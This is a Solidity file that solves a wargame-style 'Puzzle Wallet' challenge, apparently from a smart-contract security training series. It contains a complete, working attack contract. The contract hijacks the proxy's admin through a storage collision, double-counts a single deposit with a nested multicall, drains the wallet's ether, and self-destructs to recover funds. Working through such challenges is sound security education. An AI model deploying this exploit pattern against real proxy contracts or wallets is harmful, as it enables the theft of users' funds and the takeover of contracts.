// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
pragma experimental ABIEncoderV2;

/**
 * @title 24. PUZZLE WALLET
 * @dev Hijack this wallet to become the admin of the proxy.
 */

interface IPuzzleWallet {
    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

// We need to override maxBalance with setMaxBalance() in the puzzleWallet contract.
// Because of a storage collision, doing this will override the proxy contract's admin.
// !!! DON'T FORGET TO SEND 0.001 ETH WHEN DEPLIYING THE CONTRACT !!! (or use the forgetToDeposit function...)
contract Puzzled {
    IPuzzleWallet private immutable puzzleWallet;

    constructor(address _puzzleWallet) payable {
        puzzleWallet = IPuzzleWallet(_puzzleWallet);
    }

    function forgetToDeposit() public payable {
        (bool success, ) = address(this).call{value: 0.002 ether}("");
        require(success, "Eth transfer failed");
    }

    function attack() public {
        // 1. Become the puzzleWallet owner, thanks to storage collision
        puzzleWallet.proposeNewAdmin(address(this));

        // 2. Now, we can whitelist ourselves and pass the onlyWhitelisted modifier
        puzzleWallet.addToWhitelist(address(this));

        // 3. Now, the trickky part... We need to set the maxBalance to 0, to avoid the "Max balance reached" error
        // To do that, we need to deposit, but have the contract believes our deposit was bigger than what we send!
        // This can be done by nesting a multicall within a multicall, which will update our balance twice for a single amount sent.
        /*
         * - multicall:
         *     - deposit 0.001 ether
         *     - multicall:
         *         - deposit 0.001 ether
         */

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        // Nested multicall
        data[1] = abi.encodeWithSignature("multicall(bytes[])", deposit_data);
        puzzleWallet.multicall{value: 0.001 ether}(data);

        // 4. Now, we can drain the contract to set the maxBalance to 0, then update its value with our address
        puzzleWallet.execute(msg.sender, 0.002 ether, "");
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(puzzleWallet.admin() == msg.sender, "Hack failed!");
        // 5. let's get our funds back :)
        selfdestruct(payable(msg.sender));
    }
}
